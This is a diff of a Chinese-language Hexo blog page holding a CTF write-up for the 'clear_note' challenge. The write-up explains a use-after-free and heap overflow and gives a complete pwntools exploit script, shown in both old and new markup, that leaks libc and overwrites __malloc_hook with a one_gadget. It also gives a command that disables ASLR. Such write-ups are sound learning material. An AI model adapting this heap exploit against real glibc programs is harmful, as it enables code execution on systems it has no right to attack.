@@ -19,7 +19,7 @@
 
 <script class="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+    var CONFIG = {"hostname":"driverxdw.github.io","root":"/","scheme":"Muse","version":"8.0.0-rc.5","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":true,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
   </script>
 
   <meta name="description" content="dg010赛题复现师傅去打dg010去了，扔给我一道题让我做，无奈当时恰好要去上课，做到一半就扔那儿了，现在有时间了，就做了一下。">
@@ -93,7 +93,7 @@
   </style>
 </noscript>
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
   <div class="headband"></div>
@@ -318,11 +318,67 @@
         <h1 id="dg010赛题复现"><a href="#dg010赛题复现" class="headerlink" title="dg010赛题复现"></a>dg010赛题复现</h1><p>师傅去打dg010去了，扔给我一道题让我做，无奈当时恰好要去上课，做到一半就扔那儿了，现在有时间了，就做了一下。</p>
 <a id="more"></a>  
 <p>首先打开ida看下发现偏移是相对文件的，所以肯定是开启了pie，之后看函数，主要是dele和add里，dele中没有立即对chukList中的ptr清零导致会出现野指针，还有就是add函数中使用的是scanf进行输入，没有对输入长度进行检测，所以存在堆溢出。<br>分析完两个主要的漏洞接下来思考解题策略，开启了pie我们可以通过unsorted bin泄露，得到libc，checksec看了一下发现保护全开，由于保护全开，所以无法进行got覆写之类的，这里考虑mallocHook或者freeHook的覆写，freeHook看了下发现在内存中周边没有合适的size绕过fastbin检查，而mallocHook恰好在ptr-0x13的位置是有合适的size的(低字节0x7f)，如果add的是0x60的fast chunk，那么条件是符合的，所以这里可以用the house of spirit进行mallocHook写oneGadget，就可以利用成功了。<br>这道题的坑点在于开启pie的程序调试的时候不方便，因为代码段是随机化的，break断点不固定，需要手动去断点比较烦。这里要解决这个问题目前我知道的有两种方法，第一种是队友诉我的，通过关闭本地系统的内存地址随机化保护进行调试。echo 0  &gt;/proc/sys/kernel/randomize_va_space 这样的话就能暂时关闭随机化，默认镜像的加载基址是0x555555554000，但是由于ida中显示的指令是相对文件的基址，所以想要下断的话还是需要进行一定的计算，这里队友告诉我可以通过ida中修改segment段的基址，也就是自己制定段加载基址来确定text指令段的内存地址。试了一下还是相当方便的。以后本地调试的时候可以利用这种方法，非常方便。<br>还有一种方法就是通过在脚本中加入一些函数通过查找proc中的相关地址来得到加载地址，也行，不过感觉有一点麻烦，不过调试的时候更加真实吧233333，各有利弊。 </p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="attribute">p</span>=process('./clear_note')</span><br><span class="line"><span class="attribute">libc</span>=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br><span class="line"><span class="comment">#gdb.attach(p,'''</span></span><br><span class="line"><span class="comment">#	break *0x0000555555554E9A </span></span><br><span class="line"><span class="comment">#	continue</span></span><br><span class="line"><span class="comment">#''')</span></span><br><span class="line">def <span class="builtin-name">add</span>(size,data):</span><br><span class="line">    p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"info: "</span>)</span><br><span class="line">    p.send(data)</span><br><span class="line">    p.sendline(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"ndex: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'info: '</span>)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">add</span>(0x100,<span class="string">'a'</span>)</span><br><span class="line"><span class="builtin-name">add</span>(0x60,<span class="string">'b'</span>)</span><br><span class="line">dele(0)</span><br><span class="line">show(0)</span><br><span class="line"><span class="attribute">arena</span>=u64(p.recv(6).ljust(8,'\x00'))</span><br><span class="line">libc.<span class="attribute">address</span>=arena-0x3c4b78</span><br><span class="line">log.<span class="builtin-name">info</span>(<span class="string">'libcBase &gt; '</span>+hex(libc.address))</span><br><span class="line"><span class="attribute">mallocHook</span>=libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.<span class="builtin-name">info</span>(<span class="string">'__malloc_hook &gt; '</span>+hex(mallocHook))</span><br><span class="line"><span class="comment">#oneGadget=libc.address+0x45216</span></span><br><span class="line"><span class="attribute">oneGadget</span>=libc.address+0xf1147</span><br><span class="line"><span class="comment">#oneGadget=libc.address+0x4526a</span></span><br><span class="line"><span class="comment">#oneGadget=libc.address+0xf02a4</span></span><br><span class="line"><span class="attribute">writeAddress</span>=mallocHook-0x13</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(0)</span><br><span class="line">dele(1)</span><br><span class="line"></span><br><span class="line"><span class="builtin-name">add</span>(0x100,<span class="string">'a'</span><span class="number">*0</span>x100+p64(0)+p64(0x71)+p64(writeAddress))</span><br><span class="line"><span class="builtin-name">add</span>(0x60,<span class="string">'b'</span>)</span><br><span class="line">dele(0)</span><br><span class="line">dele(0)</span><br><span class="line">dele(1)</span><br><span class="line">dele(1)</span><br><span class="line"><span class="builtin-name">add</span>(0x60,<span class="string">'c'</span><span class="number">*3</span>+p64(oneGadget))</span><br><span class="line">p.recvuntil(<span class="string">"choice&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">p.sendline(<span class="string">'10'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code>from pwn import *
+p=process(&#39;./clear_note&#39;)
+libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+#gdb.attach(p,&#39;&#39;&#39;
+#    break *0x0000555555554E9A 
+#    continue
+#&#39;&#39;&#39;)
+def add(size,data):
+    p.recvuntil(&quot;choice&gt;&gt; &quot;)
+    p.sendline(&#39;1&#39;)
+    p.recvuntil(&quot;size: &quot;)
+    p.sendline(str(size))
+    p.recvuntil(&quot;info: &quot;)
+    p.send(data)
+    p.sendline(&#39;\n&#39;)
+
+def show(idx):
+    p.recvuntil(&quot;choice&gt;&gt; &quot;)
+    p.sendline(&#39;2&#39;)
+    p.recvuntil(&quot;ndex: &quot;)
+    p.sendline(str(idx))
+    p.recvuntil(&#39;info: &#39;)
+
+def dele(idx):
+    p.recvuntil(&quot;choice&gt;&gt; &quot;)
+    p.sendline(&#39;3&#39;)
+    p.recvuntil(&quot;index: &quot;)
+    p.sendline(str(idx))
+
+add(0x100,&#39;a&#39;)
+add(0x60,&#39;b&#39;)
+dele(0)
+show(0)
+arena=u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+libc.address=arena-0x3c4b78
+log.info(&#39;libcBase &gt; &#39;+hex(libc.address))
+mallocHook=libc.symbols[&#39;__malloc_hook&#39;]
+log.info(&#39;__malloc_hook &gt; &#39;+hex(mallocHook))
+#oneGadget=libc.address+0x45216
+oneGadget=libc.address+0xf1147
+#oneGadget=libc.address+0x4526a
+#oneGadget=libc.address+0xf02a4
+writeAddress=mallocHook-0x13
 
 
+dele(1)
+dele(0)
+dele(1)
 
-
+add(0x100,&#39;a&#39;*0x100+p64(0)+p64(0x71)+p64(writeAddress))
+add(0x60,&#39;b&#39;)
+dele(0)
+dele(0)
+dele(1)
+dele(1)
+add(0x60,&#39;c&#39;*3+p64(oneGadget))
+p.recvuntil(&quot;choice&gt;&gt; &quot;)
+p.sendline(&#39;1&#39;)
+p.recvuntil(&quot;size: &quot;)
+p.sendline(&#39;10&#39;)
+p.interactive()</code></pre>
     </div>
 
     
@@ -427,6 +483,8 @@
 
   
   <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/components/prism-core.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/autoloader/prism-autoloader.min.js"></script>
 <script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
   
